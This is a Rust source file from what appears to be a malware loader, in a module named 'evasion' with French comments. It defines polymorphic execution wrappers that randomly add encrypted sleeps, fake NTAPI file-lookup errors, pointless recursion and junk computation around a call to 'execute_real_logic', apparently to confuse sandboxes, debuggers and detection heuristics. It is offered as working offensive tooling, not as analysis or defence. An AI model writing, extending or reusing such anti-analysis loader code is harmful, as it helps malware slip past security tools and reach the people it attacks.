// loader/src/evasion/flow.rs

use rand::Rng;

use crate::{evasion::anti_debug::encrypted_sleep, execute_real_logic, native::{call::NativeAPI, file_ops::nt_file_exists}};

    
    /// Exécuter le code avec un flow polymorphique
pub fn polymorphic_execute<F>(func: F) 
    where
        F: FnOnce() + Send + 'static,
    {
        let method = rand::thread_rng().gen_range(0..4);
        
        match method {
            0 => execute_with_delays(func),
            1 => execute_with_fake_errors(func),
            2 => execute_with_recursion(func),
            3 => execute_with_jumps(func),
            _ => func(),
        }
    }


    
fn execute_with_delays<F>(func: F)
    where
        F: FnOnce() + Send + 'static,
    {
        let mut rng = rand::thread_rng();
        
        // Délais aléatoires avant/après
        for _ in 0..rng.gen_range(1..4) {
            encrypted_sleep(rng.gen_range(1..50));
            
            // Petits calculs entre les délais
            let mut x = 0u64;
            for i in 0..100 {
                x = x.wrapping_add(i);
            }
        }
        let _ = execute_real_logic();
        let _ = func;
        
        // Délais après
        encrypted_sleep(rng.gen_range(10..100));
    }



    
fn execute_with_fake_errors<F>(func: F)
where
    F: FnOnce() + Send + 'static,
{
    // Simuler des erreurs avec NTAPI
    unsafe {
        if let Ok(native_api) = NativeAPI::new() {
            // Vérifier si un fichier n'existe pas (simule une erreur)
            let _ = nt_file_exists(&native_api, "C:\\This\\Does\\Not\\Exist.fake");
            
            // Autre exemple: essayer de se connecter à une IP invalide
            // (si tu as implémenté nt_tcp_connect)
            let _ = execute_real_logic();
            let _ = func;
            
            // Plus d'erreurs factices
            let _ = nt_file_exists(&native_api, "C:\\Fake\\Path\\To\\Nothing.xyz");
        } else {
            // Fallback si NativeAPI échoue
            let _ = func;
        }
    }
}



    
fn execute_with_recursion<F>(func: F)
    where
        F: FnOnce() + Send + 'static,
    {
        fn recursive_wrapper<F2>(depth: usize, func: F2) 
        where
            F2: FnOnce() + 'static,
        {
            if depth == 0 {
                let _ = execute_real_logic();
                let _ = func;
            } else {
                // Faire un calcul inutile
                let mut x = depth as u64;
                for i in 0..10 {
                    x = x.wrapping_mul(i + 1);
                }
                
                // Rappeler avec une closure qui appelle func
                recursive_wrapper(depth - 1, func);
            }
        }
        
        let depth = rand::thread_rng().gen_range(5..15);
        recursive_wrapper(depth, func);
    }



    
fn execute_with_jumps<F>(func: F)
where
    F: FnOnce() + Send + 'static,
{
    // Exécuter directement d'abord
    let _ = execute_real_logic();
    
    // Puis faire du bruit après
    let mut rng = rand::thread_rng();
    
    // Faire des calculs factices
    for _ in 0..rng.gen_range(3..8) {
        let mut x = 0u64;
        for j in 0..100 {
            x = x.wrapping_add(j as u64);
            x = x.rotate_left((j % 8) as u32);
        }
        encrypted_sleep(rng.gen_range(1..10));
    }
}